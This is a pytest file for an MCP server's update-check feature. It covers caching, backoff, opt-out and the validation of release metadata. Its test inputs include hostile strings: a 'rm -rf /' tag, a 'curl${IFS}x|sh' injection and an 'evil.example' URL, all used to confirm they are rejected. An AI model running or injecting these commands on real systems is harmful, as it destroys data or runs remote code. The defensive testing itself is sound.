import json
import time

import httpx
import pytest
from fastmcp import Client
from fastmcp.server.auth.providers.jwt import RSAKeyPair
from test_server import Recorder, configuration

from zai_keysso import __version__, update_check
from zai_keysso.server import create_server

TOOL = "keysso_check_update"
RELEASE = {
    "tag_name": "v99.0.0",
    "html_url": "https://github.com/zai-one/keysso-mcp/releases/tag/v99.0.0",
    "draft": False,
    "prerelease": False,
}


@pytest.fixture(autouse=True)
def enabled(monkeypatch):
    monkeypatch.delenv(update_check.ENV_DISABLE, raising=False)


def no_network():
    # pytest.fail raises a BaseException, so check_update's degrade-quietly handler cannot swallow it.
    pytest.fail("network must not be used")


class Counting:
    def __init__(self, result=None):
        self.calls = 0
        self.result = result

    def __call__(self):
        self.calls += 1
        if self.result is None:
            raise httpx.ConnectError("offline")
        return self.result


def test_newer_release_suggests_matching_install_command(tmp_path):
    cache = tmp_path / "update-check.json"
    result = update_check.check_update(cache, fetch=lambda: RELEASE, now=1000.0)
    assert result["update_available"] is True
    assert result["current_version"] == __version__
    assert result["latest_version"] == "99.0.0"
    assert result["release_url"] == RELEASE["html_url"]
    assert result["update_command"] == (
        'uv tool install --force "zai-keysso-mcp @ https://github.com/zai-one/keysso-mcp/releases/'
        'download/v99.0.0/zai_keysso_mcp-99.0.0-py3-none-any.whl"'
    )
    assert result["auto_update"] is False
    assert json.loads(cache.read_text())["latest_version"] == "99.0.0"


def test_cache_is_reused_for_a_day_and_refreshed_after(tmp_path):
    cache = tmp_path / "update-check.json"
    update_check.check_update(cache, fetch=lambda: RELEASE, now=1000.0)
    cached = update_check.check_update(cache, fetch=no_network, now=1000.0 + 3600)
    assert cached["source"] == "cache" and cached["update_available"] is True
    forced_too_soon = update_check.check_update(cache, force=True, fetch=no_network, now=1030.0)
    assert forced_too_soon["source"] == "cache"
    current = {**RELEASE, "tag_name": f"v{__version__}"}
    refreshed = update_check.check_update(cache, fetch=lambda: current, now=1000.0 + 25 * 3600)
    assert refreshed["source"] == "github"
    assert refreshed["update_available"] is False and refreshed["update_command"] is None


def test_offline_or_rate_limited_fails_gracefully(tmp_path):
    def offline():
        raise httpx.ConnectError("offline")

    cache = tmp_path / "update-check.json"
    result = update_check.check_update(cache, fetch=offline, now=1000.0)
    assert result["status"] == "unavailable" and result["update_available"] is None
    assert result["error"] == "ConnectError"
    backing_off = update_check.check_update(cache, fetch=no_network, now=1000.0)
    assert backing_off["status"] == "unavailable"
    update_check.check_update(cache, fetch=lambda: RELEASE, now=1000.0 + 31 * 60)
    stale = update_check.check_update(cache, fetch=offline, now=1000.0 + 30 * 3600)
    assert stale["last_known"]["latest_version"] == "99.0.0"


@pytest.mark.parametrize(
    "payload",
    [
        {"tag_name": "nightly"},
        {**RELEASE, "prerelease": True},
        {**RELEASE, "tag_name": "v1.0.0; rm -rf /"},
        {**RELEASE, "tag_name": "v1.0.0\n"},
        {**RELEASE, "tag_name": "v\u0661.0"},
        {**RELEASE, "tag_name": 1},
    ],
)
def test_untrusted_release_metadata_is_rejected(tmp_path, payload):
    result = update_check.check_update(tmp_path / "c.json", fetch=lambda: payload, now=1.0)
    assert result["status"] == "unavailable"
    assert "latest_version" not in json.loads((tmp_path / "c.json").read_text())


def test_foreign_release_url_falls_back_to_repository(tmp_path):
    payload = {**RELEASE, "html_url": "https://evil.example/release"}
    result = update_check.check_update(tmp_path / "c.json", fetch=lambda: payload, now=1.0)
    assert result["release_url"] == "https://github.com/zai-one/keysso-mcp/releases"


def test_env_opt_out_disables_network_and_hint(tmp_path, monkeypatch):
    cache = tmp_path / "update-check.json"
    update_check.check_update(cache, fetch=lambda: RELEASE, now=time.time())
    monkeypatch.setenv(update_check.ENV_DISABLE, "1")
    result = update_check.check_update(cache, force=True, fetch=no_network)
    assert result["enabled"] is False and result["status"] == "disabled"
    assert update_check.cached_hint(cache) is None
    assert update_check.refresh_in_background(cache) is None


def test_version_parsing():
    assert update_check.parse_version("v0.10.0") > update_check.parse_version("0.9.9")
    assert update_check.parse_version("1.2") == update_check.parse_version("v1.2.0")
    assert update_check.parse_version("1.2.3-rc1") is None


def test_fetch_uses_public_api_with_timeout(monkeypatch):
    seen = {}

    def fake_get(url, **kwargs):
        seen.update(url=url, **kwargs)
        return httpx.Response(200, json=RELEASE, request=httpx.Request("GET", url))

    monkeypatch.setattr(update_check.httpx, "get", fake_get)
    assert update_check.fetch_latest_release()["tag_name"] == "v99.0.0"
    assert seen["url"] == "https://api.github.com/repos/zai-one/keysso-mcp/releases/latest"
    assert seen["timeout"] <= 5 and "Authorization" not in seen["headers"]


async def test_tool_and_startup_hint_use_cache_without_blocking(tmp_path, monkeypatch):
    settings = configuration(tmp_path, RSAKeyPair.generate(), auth_mode="operator")
    cache = settings.state_path.parent / update_check.CACHE_FILE
    update_check.check_update(cache, fetch=lambda: RELEASE, now=time.time())
    monkeypatch.setattr(update_check, "fetch_latest_release", no_network)
    monkeypatch.setattr(update_check.httpx, "get", lambda *a, **k: no_network())
    recorder = Recorder()
    server = create_server(settings, transport="stdio", http_factory=recorder.factory)
    assert "99.0.0 is available" in server.instructions
    assert TOOL in server.instructions
    async with Client(server) as client:
        tools = {tool.name: tool for tool in await client.list_tools()}
        assert tools[TOOL].annotations.readOnlyHint is True
        assert tools[TOOL].annotations.idempotentHint is False
        schema = tools[TOOL].inputSchema["properties"]
        assert schema == {"force_refresh": {"default": False, "type": "boolean"}}
        result = (await client.call_tool(TOOL, {})).data
    assert result["update_available"] is True and result["source"] == "cache"
    assert recorder.calls == []


def test_no_hint_without_cache(tmp_path):
    settings = configuration(tmp_path, RSAKeyPair.generate(), auth_mode="operator")
    assert create_server(settings, transport="stdio").instructions is None


INJECTION = 'v9.9.9";curl${IFS}x|sh;"'


def test_injected_tag_never_reaches_result_cache_or_instructions(tmp_path, monkeypatch):
    settings = configuration(tmp_path, RSAKeyPair.generate(), auth_mode="operator")
    cache = settings.state_path.parent / update_check.CACHE_FILE
    payload = {
        **RELEASE,
        "tag_name": INJECTION,
        "html_url": 'https://github.com/zai-one/keysso-mcp/releases/x"y',
    }
    result = update_check.check_update(cache, fetch=lambda: payload, now=time.time())
    assert result["status"] == "unavailable" and "latest_version" not in result
    assert "9.9.9" not in json.dumps(result) and "curl" not in json.dumps(result)
    assert "9.9.9" not in cache.read_text() and "curl" not in cache.read_text()
    assert update_check.cached_hint(cache) is None
    assert create_server(settings, transport="stdio").instructions is None


@pytest.mark.parametrize(
    "poisoned",
    [
        {"latest_version": INJECTION},
        {"latest_version": "9.9.9;curl"},
        {"latest_version": "v99.0.0"},
        {"release_url": 'https://github.com/zai-one/keysso-mcp/releases";curl x|sh;"'},
        {"release_url": "https://github.com/zai-one/keysso-mcp/releasesevil"},
        {"checked_at": True},
    ],
)
def test_poisoned_cache_is_ignored(tmp_path, poisoned):
    cache = tmp_path / "update-check.json"
    good = {"latest_version": "99.0.0", "release_url": RELEASE["html_url"], "checked_at": time.time()}
    cache.write_text(json.dumps({**good, **poisoned}))
    assert update_check.cached_hint(cache) is None
    fetch = Counting()
    result = update_check.check_update(cache, fetch=fetch)
    assert fetch.calls == 1 and result["status"] == "unavailable" and "last_known" not in result
    assert "curl" not in json.dumps(result)


def test_offline_repeated_calls_fetch_once_and_back_off(tmp_path):
    cache = tmp_path / "update-check.json"
    fetch = Counting()
    for offset in (0, 1, 60, 600, 29 * 60):
        result = update_check.check_update(cache, fetch=fetch, now=1000.0 + offset)
        assert result["status"] == "unavailable" and result["error"] == "ConnectError"
    assert fetch.calls == 1
    assert update_check.check_update(cache, fetch=no_network, now=1000.0 + 60)["retry_after_unix"] == 2800
    update_check.check_update(cache, fetch=fetch, now=1000.0 + 31 * 60)
    assert fetch.calls == 2


def test_failure_after_stale_cache_keeps_last_good_and_backs_off(tmp_path):
    cache = tmp_path / "update-check.json"
    update_check.check_update(cache, fetch=lambda: RELEASE, now=1000.0)
    fetch = Counting()
    later = 1000.0 + 30 * 3600
    first = update_check.check_update(cache, fetch=fetch, now=later)
    again = update_check.check_update(cache, fetch=fetch, now=later + 120)
    assert fetch.calls == 1
    assert first["last_known"]["latest_version"] == again["last_known"]["latest_version"] == "99.0.0"
    assert update_check.cached_hint(cache) is not None  # last good release still drives the hint


def test_forced_calls_within_a_minute_fetch_once_even_without_cache(tmp_path):
    cache = tmp_path / "update-check.json"
    failing = Counting()
    for offset in (0, 10, 59):
        result = update_check.check_update(cache, force=True, fetch=failing, now=1000.0 + offset)
        assert result["status"] == "unavailable"
    assert failing.calls == 1
    succeeding = Counting(RELEASE)
    assert update_check.check_update(cache, force=True, fetch=succeeding, now=1060.0)["source"] == "github"
    for offset in (1, 30, 59):
        result = update_check.check_update(cache, force=True, fetch=succeeding, now=1060.0 + offset)
        assert result["source"] == "cache"
    assert succeeding.calls == 1
    update_check.check_update(cache, force=True, fetch=succeeding, now=1120.0)
    assert succeeding.calls == 2


def test_default_fetcher_is_resolved_at_call_time(tmp_path, monkeypatch):
    fetch = Counting(RELEASE)
    monkeypatch.setattr(update_check, "fetch_latest_release", fetch)
    assert update_check.check_update(tmp_path / "c.json", now=1.0)["source"] == "github"
    assert fetch.calls == 1


def test_background_refresh_obeys_backoff(tmp_path, monkeypatch):
    cache = tmp_path / "update-check.json"
    update_check.check_update(cache, fetch=Counting(), now=time.time())
    monkeypatch.setattr(update_check, "fetch_latest_release", no_network)
    assert update_check.refresh_in_background(cache) is None
    fetch = Counting(RELEASE)
    monkeypatch.setattr(update_check, "fetch_latest_release", fetch)
    thread = update_check.refresh_in_background(tmp_path / "fresh.json")
    thread.join(timeout=5)
    assert fetch.calls == 1
    assert update_check.refresh_in_background(tmp_path / "fresh.json") is None
